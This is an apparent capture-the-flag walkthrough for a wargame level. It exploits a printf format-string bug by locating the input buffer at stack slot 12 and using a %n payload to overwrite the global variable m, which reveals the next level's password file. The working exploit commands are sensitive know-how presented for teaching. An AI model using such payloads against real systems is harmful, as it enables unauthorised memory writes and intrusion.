# level04 — walkthrough

## 1. Run the binary

We run `level04` and notice it reads whatever we pass via **stdin**, not argv.

## 2. Read the binary — find the vulnerability

`main()` calls `n()`. `n()` calls `fgets(local_20c, 0x200, stdin)` (reads our input into the buffer `local_20c`), then calls `p(local_20c)`. `p()` does `printf(param_1)` — our input is passed **directly as the format string** with no `"%s"`.

That's the weakness: our `%` directives get interpreted, so we can read the stack and find where our buffer sits. We walk the stack with a marker to find its slot:

```bash
python -c 'print "AAAA" + ".%x"*20' | ./level4   # 41414141 appears at field 12
python -c 'print "AAAA" + "%12$x"' | ./level4     # confirms: slot 12 = our buffer
```

`41414141` is `"AAAA"` read as a value, so the slot printing it (field 12) is our input buffer. **Our buffer is argument slot 12.**

## 3. Find the target address

```bash
objdump -t level4 | grep -w m
```

```
08049810 g     O .bss  00000004  m        ->  &m = 0x08049810
```

## 4. Find the target value

In gdb, `disas n` → the `cmp` is against `0x1025544`. Convert:

```
p/d 0x1025544   = 16930116
```

Goal: make `m == 0x1025544`, i.e. **write 16930116 into `m`**.

```
%12$x -> reads slot 12 (that's how we found it)
%12$n -> writes the printed-char count to the address stored in slot 12
```

## 5. Build the write

Instead of *printing* slot 12, we now *write* to it. We put `&m` in the buffer (slot 12) and inflate the printed-character count to 16930116, then fire `%12$n`:

```bash
python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' | ./level4
```

- `\x10\x98\x04\x08` = `0x08049810` in **little-endian** → prints 4 bytes, and lands `&m` in slot 12.
- **Why width 16930112 and not 16930116?** `%n` writes the *total* characters printed so far. The 4 address bytes already printed count as 4. So the padding must supply `16930116 - 4 = 16930112` more. `%16930112d` pads one consumed stack value out to 16930112 chars → total = `4 + 16930112 = 16930116`. If we used width 16930116 we'd overshoot by 4 and write `0x1025548` into `m`, and the `cmp` would fail.
- `%12$n` then writes 16930116 (= `0x1025544`) to the address held at slot 12 (`&m`) → `m` becomes `0x1025544`.

The `if` passes and the binary runs `cat /home/user/level5/.pass`.

## Summary

We can't touch `m` directly, but the format-string bug lets us (a) find our input buffer at argument slot 12 and (b) use `%n` to write a controlled count to any address we plant there. So we write 16930116 **to the address held at slot 12** — and that address is `&m` — so `m` ends up equal to 16930116 = `0x1025544`.